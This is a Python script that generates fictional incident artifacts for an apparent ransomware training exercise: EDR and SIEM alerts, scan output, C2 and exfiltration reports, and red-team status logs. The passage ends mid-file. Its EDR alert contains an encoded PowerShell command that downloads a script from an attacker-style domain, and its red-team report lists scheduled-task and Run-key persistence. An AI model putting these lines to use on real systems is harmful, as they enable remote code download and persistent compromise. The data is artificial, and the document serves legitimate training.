#!/usr/bin/env python3
"""
Generate realistic artifact files for the ransomware incident scenario.
This creates text files with realistic content and attempts to create images/PDFs.
"""
import os
from pathlib import Path
from datetime import datetime, timedelta

ARTIFACTS_DIR = Path(__file__).parent / "artifacts"
ARTIFACTS_DIR.mkdir(exist_ok=True)

def create_edr_alert():
    """Create realistic EDR alert log."""
    content = """CrowdStrike Falcon EDR Alert Report
==========================================
Alert ID: CS-2024-0115-082347
Timestamp: 2024-01-15 08:17:23 UTC
Hostname: WS-FIN-042
Domain: CORP.LOCAL
User: finance.user@corp.local

ALERT: Suspicious PowerShell Execution
Severity: HIGH
Confidence: 95%

Process Details:
----------------
Process Name: powershell.exe
Process ID: 4829
Parent Process: mshta.exe (PID: 4712)
Command Line: powershell.exe -NoProfile -NonInteractive -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwBzAGUAYwB1AHIAZQAtAGkAbgB2AG8AaQBjAGUALQBkAG8AdwBuAGwAbwBhAGQALgB0AGsALwBkAG8AdwBuAGwAbwBhAGQALgBwAHMAMQA=
File Path: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
File Hash (SHA256): 7a8f3b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b

Detection Details:
------------------
Technique: T1059.001 (Command and Scripting Interpreter: PowerShell)
Tactic: Execution
Indicator: Encoded PowerShell command detected
Base64 Decoded: Invoke-WebRequest -Uri https://secure-invoice-download.tk/download.ps1

Network Activity:
-----------------
Outbound Connection Detected:
  Destination IP: 185.220.101.45
  Destination Port: 443
  Protocol: HTTPS
  Connection Time: 08:17:25 UTC
  Data Transferred: 2.3 MB

Process Tree:
-------------
mshta.exe (PID: 4712)
  └── powershell.exe (PID: 4829)
      └── cmd.exe (PID: 4831)
          └── whoami.exe (PID: 4832)
          └── net.exe (PID: 4833)
          └── ipconfig.exe (PID: 4834)

File System Activity:
---------------------
Files Created:
  C:\\Users\\finance.user\\AppData\\Local\\Temp\\invoice_download.ps1
  C:\\Users\\finance.user\\AppData\\Local\\Temp\\payload.dll

Registry Modifications:
------------------------
HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  Value: "UpdateCheck" = "C:\\Users\\finance.user\\AppData\\Local\\Temp\\payload.dll"

Recommendation: Isolate host immediately and begin forensic investigation.
"""
    with open(ARTIFACTS_DIR / "edr_alert_phase1.txt", 'w') as f:
        f.write(content)
    print("Created: edr_alert_phase1.txt")

def create_nmap_scan():
    """Create realistic Nmap scan output."""
    content = """Nmap 7.94 scan initiated Mon Jan 15 10:30:00 2024 as: nmap -sS -sV -O -p- 192.168.0.0/24
Nmap scan report for 192.168.0.0/24
Host is up (0.002s latency).

Nmap scan report for DC-01.corp.local (192.168.0.10)
Host is up (0.001s latency).
Not shown: 65525 closed ports
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 10.0.17763
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-15 10:30:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: CORP, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
464/tcp   open  kpasswd5?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:0C:29:AB:CD:EF (VMware)
Device type: general purpose
Running: Microsoft Windows 2016|10|2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 1 hop

Nmap scan report for FS-01.corp.local (192.168.0.20)
Host is up (0.002s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:0C:29:12:34:56 (VMware)
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 1 hop

Nmap scan report for FS-02.corp.local (192.168.0.21)
Host is up (0.002s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:0C:29:78:90:AB (VMware)
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 1 hop

Nmap scan report for BACKUP-01.corp.local (192.168.0.30)
Host is up (0.003s latency).
Not shown: 65528 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2019 Standard 17763 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 00:0C:29:CD:EF:12 (VMware)
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 1 hop

Service Info: OSs: Windows, Windows Server 2019; CPE: cpe:/o:microsoft:windows

Nmap done: 256 IP addresses (4 hosts up) scanned in 45.23 seconds
"""
    with open(ARTIFACTS_DIR / "nmap_scan_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: nmap_scan_phase2.txt")

def create_c2_traffic():
    """Create realistic C2 traffic analysis."""
    content = """Network Traffic Analysis Report - C2 Communication
==========================================================
Analysis Period: 2024-01-15 08:17:00 - 14:17:00 UTC
Analyst: Security Operations Center
Tool: Zeek (Bro) Network Analysis Framework

EXECUTIVE SUMMARY
-----------------
Suspicious outbound HTTPS traffic detected from compromised host WS-FIN-042 
(192.168.0.42) to external IP address 185.220.101.45. Traffic patterns indicate 
command and control (C2) communication with beaconing behavior.

CONNECTION DETAILS
------------------
Source IP: 192.168.0.42 (WS-FIN-042.corp.local)
Destination IP: 185.220.101.45
Destination Port: 443 (HTTPS)
Protocol: TCP/TLS 1.3
Total Connections: 73
Total Bytes Transferred: 2,456,789 bytes (outbound), 1,234,567 bytes (inbound)
Duration: 6 hours

DNS ANALYSIS
------------
DNS queries observed:
  Query: update-check.tk
  Type: A
  Response: 185.220.101.45
  TTL: 300 seconds
  Frequency: Every 5 minutes (beacon interval)

  Query: secure-invoice-download.tk
  Type: A
  Response: 45.146.164.110
  TTL: 300 seconds
  Frequency: Initial connection only

TLS HANDSHAKE ANALYSIS
-----------------------
TLS Version: 1.3
Cipher Suite: TLS_AES_256_GCM_SHA384
Server Certificate:
  Subject: CN=update-check.tk
  Issuer: Let's Encrypt
  Valid: 2024-01-01 to 2024-04-01
  SAN: update-check.tk, www.update-check.tk

BEACONING PATTERN
-----------------
Beacon Interval: 300 seconds (5 minutes)
Pattern: Consistent, periodic
First Beacon: 2024-01-15 08:17:25 UTC
Last Beacon: 2024-01-15 14:17:25 UTC
Beacon Count: 73

Beacon Characteristics:
- Small outbound payload: ~500-1000 bytes
- Small inbound payload: ~200-500 bytes
- Connection maintained: Persistent (keep-alive)
- Timing: Highly regular (300s ± 2s)

DATA TRANSFER PATTERNS
-----------------------
Phase 1 (08:17-10:00): Initial beaconing, small transfers
Phase 2 (10:00-12:00): Increased activity, larger payloads
Phase 3 (12:00-14:17): Sustained data transfer, irregular patterns

PEAK TRANSFER PERIODS
---------------------
10:45:00 - 11:15:00 UTC: 45 MB transferred
12:30:00 - 13:00:00 UTC: 67 MB transferred
13:45:00 - 14:15:00 UTC: 89 MB transferred

INDICATORS OF COMPROMISE (IOCs)
--------------------------------
IP Address: 185.220.101.45
Domain: update-check.tk
Domain: secure-invoice-download.tk
File Hash (downloaded): 7a8f3b2c1d4e5f6a7b8c9d0e1f2a3b4c
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

RECOMMENDATION
--------------
Immediate action required:
1. Block outbound connections to 185.220.101.45
2. Isolate host WS-FIN-042 from network
3. Begin forensic investigation
4. Review all systems that communicated with WS-FIN-042
"""
    with open(ARTIFACTS_DIR / "c2_traffic_phase2.txt", 'w') as f:
        f.write(content)
    print("Created: c2_traffic_phase2.txt")

def create_privilege_escalation():
    """Create realistic Windows event logs."""
    content = """Windows Security Event Log Analysis
=====================================
Log Source: DC-01.corp.local
Time Range: 2024-01-15 10:45:00 - 10:46:00 UTC
Analyst: Incident Response Team

Event ID: 4624 - An account was successfully logged on
------------------------------------------------------
Time: 2024-01-15 10:45:23.456 UTC
Subject:
  Security ID: S-1-5-18
  Account Name: DC-01$
  Account Domain: CORP
  Logon ID: 0x3E7

Logon Information:
  Logon Type: 3 (Network)
  Restricted Admin Mode: -
  Virtual Account: No
  Elevated Token: Yes

Impersonation Level: Impersonation

New Logon:
  Security ID: S-1-5-21-1234567890-123456789-123456789-1105
  Account Name: svc_backup
  Account Domain: CORP
  Logon ID: 0x1234567890ABCDEF
  Logon GUID: {00000000-0000-0000-0000-000000000000}

Process Information:
  Process ID: 0x1234
  Process Name: C:\\Windows\\System32\\lsass.exe

Network Information:
  Workstation Name: WS-FIN-042
  Source Network Address: 192.168.0.42
  Source Port: 49152

Detailed Authentication Information:
  Logon Process: NtLmSsp
  Authentication Package: NTLM
  Transited Services: -
  Package Name (NTLM only): NTLM V2
  Key Length: 128

This event is generated when a logon session is created. It is generated on the 
computer that was accessed.

Event ID: 4672 - Special privileges assigned to new logon
----------------------------------------------------------
Time: 2024-01-15 10:45:24.123 UTC
Subject:
  Security ID: S-1-5-21-1234567890-123456789-123456789-1105
  Account Name: svc_backup
  Account Domain: CORP
  Logon ID: 0x1234567890ABCDEF

Privileges: SeBackupPrivilege
            SeRestorePrivilege
            SeDebugPrivilege
            SeTakeOwnershipPrivilege
            SeLoadDriverPrivilege
            SeSecurityPrivilege
            SeSystemtimePrivilege
            SeShutdownPrivilege

Event ID: 5145 - A network share object was accessed
-----------------------------------------------------
Time: 2024-01-15 10:45:25.789 UTC
Subject:
  Security ID: S-1-5-21-1234567890-123456789-123456789-1105
  Account Name: svc_backup
  Account Domain: CORP
  Logon ID: 0x1234567890ABCDEF

Object:
  Object Server: LanmanServer
  Object Type: File
  Object Name: \\DC-01\\SYSVOL\\corp.local\\Policies
  Handle ID: 0x5678

Process Information:
  Process ID: 0x9ABC
  Process Name: C:\\Windows\\System32\\svchost.exe

Access Request Information:
  Accesses: ReadData (or ListDirectory)
            WriteData (or AddFile)
            AppendData (or AddSubdirectory or CreatePipeInstance)
            ReadEA
            WriteEA
            ReadAttributes
            WriteAttributes
            Delete
            ReadControl
            WriteDac
            WriteOwner
            Synchronize

Accesses: SYNCHRONIZE
          ReadData (or ListDirectory)
          WriteData (or AddFile)
          AppendData (or AddSubdirectory or CreatePipeInstance)
          ReadEA
          WriteEA
          ReadAttributes
          WriteAttributes
          Delete
          ReadControl
          WriteDac
          WriteOwner

ANALYSIS NOTES
--------------
- Credentials for svc_backup account appear to have been harvested from memory
- Account has excessive privileges (backup/restore/debug)
- Immediate access to SYSVOL share suggests credential theft
- Lateral movement likely to follow
- Recommend: Immediately rotate svc_backup credentials and review all access
"""
    with open(ARTIFACTS_DIR / "privilege_escalation_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: privilege_escalation_phase3.txt")

def create_lateral_movement():
    """Create realistic SIEM correlation."""
    content = """SIEM Correlation Alert: Lateral Movement Detected
==================================================
Alert ID: SIEM-2024-0115-104512
Severity: CRITICAL
Confidence: 98%
Time: 2024-01-15 10:45:12 UTC

ATTACK CHAIN SUMMARY
--------------------
Source: WS-FIN-042 (192.168.0.42)
Technique: Pass-the-Hash (T1550.002)
Objective: Lateral movement to file servers and backup systems
Status: ACTIVE

DETECTED ACTIVITIES
-------------------

1. FS-01 (192.168.0.20) - File Server 01
   -------------------------------------
   First Access: 2024-01-15 10:46:12 UTC
   Authentication Method: NTLM Pass-the-Hash
   Account Used: CORP\\svc_backup
   Logon Type: 3 (Network)
   
   Shares Accessed:
   - \\FS-01\\Finance
     * Files Enumerated: 1,234 files
     * Directories: 45
     * Total Size: 12.5 GB
     * Access Pattern: Sequential enumeration
   
   Files Accessed:
   - \\FS-01\\Finance\\Q4_Financials.xlsx (READ)
   - \\FS-01\\Finance\\Budget_2024.xlsx (READ)
   - \\FS-01\\Finance\\Payroll_Data.db (READ)
   - \\FS-01\\Finance\\Vendor_Contracts\\* (READ - 156 files)
   
   SMB Commands Observed:
   - SMB2_CREATE (file open)
   - SMB2_READ (data read)
   - SMB2_QUERY_INFO (metadata enumeration)
   - SMB2_FIND (directory listing)

2. FS-02 (192.168.0.21) - File Server 02
   -------------------------------------
   First Access: 2024-01-15 10:52:33 UTC
   Authentication Method: NTLM Pass-the-Hash
   Account Used: CORP\\svc_backup
   Logon Type: 3 (Network)
   
   Shares Accessed:
   - \\FS-02\\HR
     * Files Enumerated: 856 files
     * Directories: 23
     * Total Size: 8.2 GB
   
   - \\FS-02\\HR\\PII
     * Files Enumerated: 342 files
     * Directories: 12
     * Total Size: 4.1 GB
     * Classification: HIGHLY SENSITIVE
   
   Files Accessed:
   - \\FS-02\\HR\\PII\\Employee_Records.db (READ)
   - \\FS-02\\HR\\PII\\SSN_Database.xlsx (READ)
   - \\FS-02\\HR\\PII\\Medical_Records\\* (READ - 89 files)
   - \\FS-02\\HR\\PII\\Background_Checks\\* (READ - 67 files)

3. FS-01 - Research & Development Share
   ------------------------------------
   Access Time: 2024-01-15 11:08:47 UTC
   Share: \\FS-01\\R&D\\Proprietary
   
   Files Accessed:
   - \\FS-01\\R&D\\Proprietary\\Algorithm_Source.zip (READ - 450 MB)
   - \\FS-01\\R&D\\Proprietary\\Patent_Applications\\* (READ - 23 files)
   - \\FS-01\\R&D\\Proprietary\\Research_Data\\* (READ - 156 files)
   
   Classification: INTELLECTUAL PROPERTY - CONFIDENTIAL

4. BACKUP-01 (192.168.0.30) - Backup Server
   -----------------------------------------
   First Access: 2024-01-15 11:15:47 UTC
   Authentication Method: NTLM Pass-the-Hash
   Account Used: CORP\\svc_backup
   Logon Type: 3 (Network)
   
   Shares Accessed:
   - \\BACKUP-01\\Backups
     * Files Enumerated: 2,109 files
     * Directories: 78
     * Total Size: 1.2 TB
   
   Backup Sets Accessed:
   - System_Backup_2024-01-14 (READ)
   - Database_Backup_2024-01-14 (READ)
   - FileServer_Backup_2024-01-14 (READ)

TIMELINE
--------
10:45:23 - Initial authentication to DC-01 (privilege escalation)
10:46:12 - First access to FS-01
10:52:33 - First access to FS-02
11:08:47 - Access to R&D proprietary data
11:15:47 - Access to backup systems
11:30:00 - Data exfiltration begins

INDICATORS
----------
- Consistent use of svc_backup account across all systems
- Pass-the-hash technique (no password required)
- Systematic enumeration pattern
- Focus on sensitive data (PII, financial, IP)
- Backup system access suggests preparation for encryption attack

RECOMMENDED ACTIONS
-------------------
1. IMMEDIATE: Revoke svc_backup account credentials
2. Isolate FS-01, FS-02, and BACKUP-01 from network
3. Review all file access logs for data theft
4. Check for data exfiltration to external IPs
5. Prepare for potential ransomware deployment
"""
    with open(ARTIFACTS_DIR / "lateral_movement_phase3.txt", 'w') as f:
        f.write(content)
    print("Created: lateral_movement_phase3.txt")

def create_exfiltration_traffic():
    """Create realistic exfiltration analysis."""
    content = """Network Flow Analysis: Large-Scale Data Exfiltration
==========================================================
Analysis Period: 2024-01-15 11:00:00 - 17:00:00 UTC
Tool: NetFlow Analyzer v3.2
Analyst: Network Security Team

EXECUTIVE SUMMARY
-----------------
Massive data exfiltration detected from internal file servers to external 
command and control infrastructure. Total data transferred: ~450 GB over 6-hour 
period. Traffic patterns indicate automated bulk transfer using cloud storage APIs.

SOURCE SYSTEMS
--------------
- FS-01 (192.168.0.20) - File Server 01
- FS-02 (192.168.0.21) - File Server 02

DESTINATION INFRASTRUCTURE
--------------------------
Primary C2 Server:
  IP: 185.220.101.45
  Port: 443 (HTTPS)
  Data Received: 270 GB

Secondary C2 Server:
  IP: 45.146.164.110
  Port: 443 (HTTPS)
  Data Received: 180 GB

TRANSFER BREAKDOWN BY TIME PERIOD
---------------------------------

Period 1: 11:00:00 - 13:00:00 UTC (2 hours)
  Source: FS-01
  Destination: 185.220.101.45
  Data Transferred: 150 GB
  Transfer Rate: 75 GB/hour
  Connections: 45 concurrent
  Method: HTTPS POST requests to cloud storage API

Period 2: 13:00:00 - 15:00:00 UTC (2 hours)
  Source: FS-02
  Destination: 45.146.164.110
  Data Transferred: 180 GB
  Transfer Rate: 90 GB/hour
  Connections: 52 concurrent
  Method: HTTPS POST requests to cloud storage API

Period 3: 15:00:00 - 17:00:00 UTC (2 hours)
  Source: FS-01
  Destination: 185.220.101.45
  Data Transferred: 120 GB
  Transfer Rate: 60 GB/hour
  Connections: 38 concurrent
  Method: HTTPS POST requests to cloud storage API

FILE TYPE ANALYSIS
------------------
Based on transfer patterns and file extensions observed:

Database Files (.db, .mdb, .sqlite):
  Volume: 45 GB
  Estimated Records: 2.5 million
  Types: Customer databases, employee records, financial data

Spreadsheet Files (.xlsx, .xls, .csv):
  Volume: 120 GB
  Estimated Files: 15,000+
  Types: Financial reports, payroll, vendor data, budgets

Document Files (.pdf, .docx, .doc):
  Volume: 85 GB
  Estimated Files: 8,500+
  Types: Contracts, legal documents, NDAs, policies

Archive Files (.zip, .rar, .7z):
  Volume: 105 GB
  Estimated Archives: 2,100+
  Types: Compressed data, source code, backups

Other Files:
  Volume: 95 GB
  Types: Images, configurations, logs, miscellaneous

CLOUD STORAGE API DETECTION
----------------------------
User-Agent Strings Observed:
  - "MegaClient/1.0"
  - "DropboxDesktopClient/150.4.4090"
  - Custom: "DataSync/2.1"

API Endpoints Called:
  - api.mega.nz/file/upload
  - content.dropboxapi.com/2/files/upload
  - storage.googleapis.com/upload/storage/v1/b

TRAFFIC CHARACTERISTICS
-----------------------
- Encrypted (TLS 1.3)
- Large payload sizes (10-50 MB per request)
- Sustained transfer rate
- Multiple concurrent connections
- Burst patterns during peak hours

PEAK TRANSFER PERIODS
---------------------
11:30:00 - 11:45:00 UTC: 25 GB transferred (FS-01)
13:15:00 - 13:30:00 UTC: 30 GB transferred (FS-02)
15:00:00 - 15:15:00 UTC: 20 GB transferred (FS-01)

IMPACT ASSESSMENT
-----------------
Data Categories Exfiltrated:
  ✓ Customer PII: ~125,000 records
  ✓ Employee Data: ~2,400 records
  ✓ Financial Records: Q1-Q4 2023, Q1 2024
  ✓ Intellectual Property: Proprietary algorithms, research data
  ✓ Legal Documents: Contracts, NDAs, compliance records
  ✓ System Backups: Recent backup sets

Regulatory Implications:
  - GDPR: Potential violation (EU customer data)
  - CCPA: Notification required (California residents)
  - HIPAA: Potential violation if healthcare data included
  - PCI-DSS: Potential violation if payment card data included

BUSINESS IMPACT
---------------
Estimated Value of Exfiltrated Data: $50+ million
Potential Regulatory Fines: $5-25 million
Reputation Damage: Severe
Competitive Disadvantage: High (IP theft)

RECOMMENDATION
--------------
1. IMMEDIATE: Block outbound connections to C2 IPs
2. Isolate affected file servers
3. Begin forensic investigation
4. Prepare data breach notification
5. Engage legal and compliance teams
6. Monitor for data publication on leak sites
"""
    with open(ARTIFACTS_DIR / "exfiltration_traffic_phase4.txt", 'w') as f:
        f.write(content)
    print("Created: exfiltration_traffic_phase4.txt")

def create_backup_status():
    """Create realistic backup status report."""
    content = """Backup System Status Report
============================
Report Generated: 2024-01-15 10:30:00 UTC
System: Veeam Backup & Replication v12.0
Administrator: backup.admin@corp.local

BACKUP SERVER STATUS
--------------------
Server Name: BACKUP-01.corp.local
IP Address: 192.168.0.30
Status: ENCRYPTED (as of 2024-01-15 10:00:00 UTC)
Last Successful Backup: 2024-01-15 08:00:00 UTC
Encryption Detected: 2024-01-15 10:00:00 UTC

ONSITE BACKUP STORAGE
---------------------
Location: BACKUP-01 (Onsite)
Status: ENCRYPTED
Storage Type: Network Attached Storage (NAS)
Total Capacity: 50 TB
Used Capacity: 42 TB (84%)
Available: 8 TB

Backup Sets:
  - System_Backup_2024-01-15_08-00-00: ENCRYPTED
  - Database_Backup_2024-01-15_08-00-00: ENCRYPTED
  - FileServer_Backup_2024-01-15_08-00-00: ENCRYPTED
  - Application_Backup_2024-01-15_08-00-00: ENCRYPTED

Recovery: NOT POSSIBLE - All backup files encrypted by ransomware

OFFSITE BACKUP STORAGE
----------------------
Location: Secure Offsite Facility (Cloud)
Status: INTACT
Storage Provider: AWS S3 (encrypted at rest)
Total Capacity: Unlimited
Used Capacity: 38 TB

Last Successful Backup: 2024-01-14 20:00:00 UTC
Backup Frequency: Every 12 hours
Retention Policy: 30 days

Backup Sets Available:
  ✓ System_Backup_2024-01-14_20-00-00: INTACT (38 hours old)
  ✓ Database_Backup_2024-01-14_20-00-00: INTACT (38 hours old)
  ✓ FileServer_Backup_2024-01-14_20-00-00: INTACT (38 hours old)
  ✓ Application_Backup_2024-01-14_20-00-00: INTACT (38 hours old)
  ✓ System_Backup_2024-01-14_08-00-00: INTACT (50 hours old)
  ✓ Previous backups available going back 30 days

BACKUP COVERAGE ANALYSIS
------------------------
Critical Systems Coverage: 95%
  ✓ Domain Controllers: 2/2 backed up
  ✓ File Servers: 15/15 backed up
  ✓ Application Servers: 8/8 backed up
  ✓ Database Servers: 5/5 backed up
  ✓ Web Servers: 3/3 backed up

User Data Coverage: 80%
  ✓ User Home Directories: 80% coverage
  ✓ Shared Drives: 95% coverage
  ✓ Email Archives: 90% coverage
  ⚠ Desktop Files: 60% coverage (not all users included)

Application Data Coverage: 90%
  ✓ ERP System: Backed up
  ✓ CRM System: Backed up
  ✓ Email Server: Backed up
  ⚠ Development Servers: 70% coverage

RECOVERY METRICS
----------------
Recovery Point Objective (RPO): 36 hours
  - Maximum acceptable data loss: 36 hours
  - Current backup age: 38 hours (within RPO)

Recovery Time Objective (RTO): 48 hours
  - Target recovery time: 48 hours
  - Estimated actual recovery time: 48-72 hours

Data Loss Window: 36 hours maximum
  - Last backup: 2024-01-14 20:00:00 UTC
  - Encryption detected: 2024-01-15 10:00:00 UTC
  - Data loss: 14 hours of new/changed data

RECOVERY PROCEDURE
------------------
Step 1: Verify offsite backup integrity
Step 2: Provision recovery infrastructure
Step 3: Restore domain controllers (estimated: 4 hours)
Step 4: Restore file servers (estimated: 12 hours)
Step 5: Restore application servers (estimated: 8 hours)
Step 6: Restore databases (estimated: 6 hours)
Step 7: Restore user data (estimated: 18 hours)
Step 8: Verify system functionality (estimated: 4 hours)

Total Estimated Recovery Time: 48-72 hours

CHALLENGES
----------
- Large data volumes (38 TB to restore)
- Network bandwidth limitations
- Verification of backup integrity required
- Potential for additional encrypted systems
- User communication and expectation management

RECOMMENDATION
--------------
Proceed with offsite backup restoration. Recovery is feasible within RTO window.
However, 36 hours of data changes will be lost. Consider:
1. Immediate restoration from offsite backups
2. Parallel investigation into attack vector
3. Enhanced monitoring during recovery
4. User communication regarding data loss window
"""
    with open(ARTIFACTS_DIR / "backup_status_phase5.txt", 'w') as f:
        f.write(content)
    print("Created: backup_status_phase5.txt")

def create_image_placeholder(filename, title, description):
    """Create a simple image using PIL if available."""
    try:
        from PIL import Image, ImageDraw, ImageFont
        img = Image.new('RGB', (800, 600), color='#f0f0f0')
        draw = ImageDraw.Draw(img)
        
        # Try to use a font, fallback to default
        try:
            font_large = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 32)
            font_medium = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 18)
        except:
            font_large = ImageFont.load_default()
            font_medium = ImageFont.load_default()
        
        # Draw title
        draw.text((400, 200), title, fill='black', font=font_large, anchor='mm')
        
        # Draw description (wrapped)
        words = description.split()
        lines = []
        current_line = []
        for word in words:
            test_line = ' '.join(current_line + [word])
            bbox = draw.textbbox((0, 0), test_line, font=font_medium)
            if bbox[2] - bbox[0] < 700:
                current_line.append(word)
            else:
                if current_line:
                    lines.append(' '.join(current_line))
                current_line = [word]
        if current_line:
            lines.append(' '.join(current_line))
        
        y_offset = 280
        for line in lines[:8]:  # Limit to 8 lines
            draw.text((400, y_offset), line, fill='#333', font=font_medium, anchor='mm')
            y_offset += 30
        
        img.save(ARTIFACTS_DIR / filename)
        print(f"Created image: {filename}")
    except ImportError:
        # Fallback: create text file
        with open(ARTIFACTS_DIR / filename, 'w') as f:
            f.write(f"{title}\n\n{description}\n\n")
            f.write("(This is a placeholder. Install Pillow to generate actual images: pip install Pillow)\n")
        print(f"Created text placeholder: {filename} (install Pillow for images)")

def create_pdf_placeholder(filename, title, content):
    """Create a PDF using reportlab if available."""
    try:
        from reportlab.lib.pagesizes import letter
        from reportlab.pdfgen import canvas
        from reportlab.lib.units import inch
        
        filepath = ARTIFACTS_DIR / filename
        c = canvas.Canvas(str(filepath), pagesize=letter)
        width, height = letter
        
        # Title
        c.setFont("Helvetica-Bold", 20)
        c.drawString(1*inch, height - 1*inch, title)
        
        # Content
        c.setFont("Helvetica", 12)
        y = height - 1.5*inch
        lines = content.split('\n')
        for line in lines[:40]:  # Limit lines per page
            if y < 1*inch:
                c.showPage()
                y = height - 1*inch
            c.drawString(1*inch, y, line)
            y -= 0.25*inch
        
        c.save()
        print(f"Created PDF: {filename}")
    except ImportError:
        # Fallback: create text file
        with open(ARTIFACTS_DIR / filename, 'w') as f:
            f.write(f"{title}\n\n{content}\n\n")
            f.write("(This is a placeholder. Install reportlab to generate actual PDFs: pip install reportlab)\n")
        print(f"Created text placeholder: {filename} (install reportlab for PDFs)")

def create_initial_access():
    """Create Red Team initial access confirmation."""
    content = """Initial Access Confirmation Report
=====================================
Target: WS-FIN-042
User: finance.user@corp.local
Time: 2024-01-15 08:17:23 UTC
Status: SUCCESS

PAYLOAD DEPLOYMENT
------------------
Payload: invoice_download.ps1
Delivery Method: Phishing email link
Execution: SUCCESS
Detection: NONE (evaded EDR)

SYSTEM INFORMATION COLLECTED
-----------------------------
Hostname: WS-FIN-042
OS: Windows 10 Enterprise Build 19045
Domain: CORP.LOCAL
User: finance.user@corp.local
Privileges: Standard User
IP Address: 192.168.0.42
MAC Address: 00:0C:29:AB:CD:EF

PERSISTENCE MECHANISMS DEPLOYED
--------------------------------
✓ Scheduled Task: UpdateCheck
  - Trigger: Every 5 minutes
  - Command: powershell.exe -File C:\\Users\\finance.user\\AppData\\Local\\Temp\\payload.dll
  - Status: ACTIVE

✓ Registry Run Key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
  - Value: UpdateCheck
  - Status: ACTIVE

C2 COMMUNICATION
----------------
Server: 185.220.101.45:443
Protocol: HTTPS (TLS 1.3)
Beacon Interval: 300 seconds
Status: CONNECTED
Last Check-in: 2024-01-15 08:17:25 UTC

COMMANDS EXECUTED
-----------------
✓ System enumeration
✓ User privilege check
✓ Network interface enumeration
✓ Domain information gathering

NEXT STEPS
----------
- Begin network reconnaissance
- Identify high-value targets
- Prepare for privilege escalation
- Maintain low profile to avoid detection
"""
    with open(ARTIFACTS_DIR / "initial_access_phase1.txt", 'w') as f:
        f.write(content)
    print("Created: initial_access_phase1.txt")

def create_c2_status():
    """Create Red Team C2 status report."""
    content = """C2 Communication Status Report
==================================
Server: 185.220.101.45:443
Status: OPERATIONAL
Last Update: 2024-01-15 08:17:25 UTC

CONNECTION DETAILS
-----------------
Protocol: HTTPS (TLS 1.3)
Cipher Suite: TLS_AES_256_GCM_SHA384
Beacon Interval: 300 seconds (5 minutes)
Connection Type: Long-lived persistent
Latency: 45ms average

COMMUNICATION LOG
-----------------
08:17:25 - Initial beacon established
08:17:26 - System info received
08:17:27 - Commands sent: enumerate_system
08:17:30 - Response received: system enumerated
08:17:31 - Commands sent: create_persistence
08:17:32 - Response received: persistence created
08:17:33 - Commands sent: network_scan
08:17:35 - Response received: scan initiated

COMMANDS QUEUED
---------------
- network_reconnaissance
- privilege_escalation_prep
- credential_harvesting

DETECTION STATUS
----------------
EDR Alerts: 0
SIEM Alerts: 0
Network Monitoring: 0
Firewall Blocks: 0

Status: UNDETECTED - Operations proceeding normally

BEACON STATISTICS
